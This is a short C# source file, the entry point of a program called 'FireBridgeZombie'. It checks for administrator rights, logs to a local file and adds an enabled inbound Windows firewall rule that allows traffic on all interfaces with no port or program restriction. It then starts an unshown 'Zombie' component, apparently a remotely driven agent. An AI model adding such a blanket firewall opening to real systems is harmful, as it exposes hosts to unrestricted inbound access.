using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using NetFwTypeLib;

namespace FireBridgeZombie
{
    class Program
    {
        static void Main()
        {
            bool IsElevated = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            
            Trace.Listeners.Add(new TextWriterTraceListener(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\zombie.txt"));
            Trace.AutoFlush = true;

            try
            {

                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(
                    Type.GetTypeFromProgID("HNetCfg.FwPolicy2"));

                INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
                firewallRule.Description = "FireBridge";
                firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN; // inbound
                firewallRule.Enabled = true;
                firewallRule.InterfaceTypes = "All";
                firewallRule.Name = "FireBridge";
                firewallPolicy.Rules.Add(firewallRule);
            }
            catch (Exception e)
            {

                Trace.WriteLine("Firewall: " + e.Message);
            }

            Trace.WriteLine("Firebridge Zombie started");
            Trace.WriteLine("Eelevated: " + IsElevated);
            new Zombie().Start();
        }


    }
}